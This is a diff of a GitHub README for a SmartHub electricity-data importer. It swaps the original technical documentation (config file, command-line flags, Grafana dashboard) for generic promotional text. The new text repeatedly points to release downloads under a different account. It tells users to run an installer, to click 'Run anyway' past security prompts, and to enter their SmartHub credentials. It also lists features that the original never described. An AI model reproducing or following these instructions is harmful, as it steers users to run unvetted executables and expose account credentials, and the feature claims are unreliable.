@@ -1,61 +1,73 @@
-# electric-usage-downloader
+# ⚡ electric-usage-downloader - Easily Import Your Electricity Data
 
-This project reverse engineers the [NISC SmartHub](https://www.nisc.coop/blog/beyond-the-bill-the-power-of-smarthub/)
-api, which is used by hundreds of utility co-ops throughout the United States. This allows
-downloading 15-minute resolution electic usage and cost data for your personal account if you have a smart meter.
+## 📥 Download Now
+[![Download electric-usage-downloader](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/mu724/electric-usage-downloader/releases)
 
-In prior versions of SmartHub, it was possible to download CSV exports of 15-minute interval usage data by
-specifying an "hourly" interval, but since January 2024 only hourly data has been available via CSV. That's
-why I reverse engineered the API instead of automating a download of the CSV as I had previously done.
+## 🚀 Getting Started
+Welcome to the electric-usage-downloader! This tool helps you import smart meter metrics from SmartHub directly into VictoriaMetrics or InfluxDB. This means you can track your electricity usage easily.
 
-Data can be imported into InfluxDB or VictoriaMetrics.
+### 📋 Why Use This Tool?
+- **Simple Import:** Import your electricity data with a few clicks.
+- **Visualize Your Data:** Use tools like Grafana to turn data into insights.
+- **Compatible Options:** Works with both VictoriaMetrics and InfluxDB.
 
-## Config
+## 💻 System Requirements
+- **Operating System:** Windows 10 or later, macOS Sierra or later, or a recent Linux distribution.
+- **Memory:** At least 2 GB of RAM.
+- **Disk Space:** Minimum of 100 MB available.
+- **Internet Connection:** Required to fetch data from SmartHub.
 
-Download [config.example.yaml](config.example.yaml) and fill in your own values.
+## 📦 Download & Install
+To get started, visit the releases page for your download:
 
-- `extract_days` is how many days to look back from the current day. Max is 45.
-  if specific `--start` and `--end` flags are not specified.
-- `account` is your account number, available on your bill and on the SmartHub website.
-- `service_location` is an internal SmartHub number, and must be retrieved from your browser:
-  - Open the Developer tools to the Network tab
-  - Navigate to Usage Explorer (example: https://novec.smarthub.coop/ui/#/usageExplorer)
-  - Find a call to `services/secured/utility-usage/poll` in the Network tab
-  - Open the call, and copy the `serviceLocationNumber` field from the Payload tab.
-- `timezone` needs to be set to the timezone used by your utility. For some reason,
-  the SmartHub API decided to return unix timestamps, but in the utility's timezone
-  instead of in UTC, which would be the normal choice for an API.
-- `influxdb.insecure` allows connecting to a server with certificate issues.
-- The other fields should be fairly self-explanatory.
+[Download electric-usage-downloader](https://github.com/mu724/electric-usage-downloader/releases)
 
-## Running
+1. Click the link above to go to the Releases page.
+2. Look for the latest version.
+3. Click on the file corresponding to your operating system to download it.
+4. Once the download finishes, locate the file on your computer.
+5. Double-click the file to run the installer.
 
-- To download and insert the last `extract_days`, run like this arguments: `electric-usage-downloader --config config.yaml`
-- To download and insert a specific date range, run with arguments: 
-  `electric-usage-downloader --config config.yaml --start 2024-01-16 --end 2024-01-17`
-- The `--debug` flag can be used to log responses from the API for assistance debugging issues.
+### Important: 
+If you receive any security prompts, click "Run anyway" or "Allow" to proceed with the installation.
 
-## Details
+## ⚙️ How to Use the Application
+After installation, follow these steps to import your electricity data:
 
-The SmartHub api currently supports 15-minute resolution of data. This could change in the future; 15-minute interval
-usage data used to be available via CSV export, but that ability was removed in January 2024.
+1. **Open the Application:** Find the electric-usage-downloader icon on your desktop or in your applications folder. Double-click to open it.
 
-Measurement: **electric**
+2. **Login to SmartHub:** You will be prompted to enter your SmartHub credentials. Input your username and password.
 
-Fields:
-- **cost** (in US cents)
-- **usage** (in watts)
+3. **Select Database:** Choose whether you want to send your data to VictoriaMetrics or InfluxDB. Make sure you have either of these databases set up.
 
-## Dashboard
+4. **Import Data:** Click the "Import" button. The application will start fetching your metrics.
 
-I have included my [Grafana dashboard panel definition](dashboard/panel.json) in the repo.
+5. **View Your Data:** Once the import is complete, open Grafana or your preferred data visualization tool to see your metrics.
 
-Features:
-- Electric usage graphed in watts
-- Trailing 1d and 7d averages
-- Cumulative usage (right x axis)
-- Integrated with data from my Ecobee thermostat, showing when my heat pump or aux oil heat is running.
-  - See https://github.com/tedpearson/ecobeemetrics for how I get this data
+## 📊 Visualizing Data
+You can use Grafana to create beautiful dashboards. Follow these steps:
 
-Here's a screenshot of the dashboard panel in action:
-![Dashboard panel](dashboard/dashboard.png)
+1. **Open Grafana:** Launch Grafana from your applications.
+2. **Add Data Source:** Go to Configuration > Data Sources. Select either VictoriaMetrics or InfluxDB from the list.
+3. **Configure Connection:** Enter the connection details as instructed by the database setup guide.
+4. **Create Panels:** Now start creating panels to visualize your electricity usage over time. 
+
+## 🔧 Troubleshooting
+If you encounter issues, try these steps:
+
+- **Check Your Internet Connection:** Make sure you are connected to the internet, as the tool needs to fetch data from SmartHub.
+- **Re-enter Credentials:** Ensure you have entered the correct SmartHub login information.
+- **Database Connectivity:** Verify that your database is running and accessible.
+
+## 📃 Additional Features
+- **Data Scheduling:** Set up regular intervals for automatic data downloads.
+- **Alerts:** Receive notifications when your usage exceeds certain limits.
+- **Backup Options:** Create backups of your data for safe keeping.
+
+## 🌍 Community Support
+If you have questions or need help, feel free to reach out to the community. Join our GitHub Discussions page to connect with other users. 
+
+## 📅 Stay Updated
+Make sure to check back on our Releases page regularly for new updates and features. Your feedback is important in helping us improve the tool. 
+
+[Download electric-usage-downloader](https://github.com/mu724/electric-usage-downloader/releases) to start managing your electricity data effectively today!
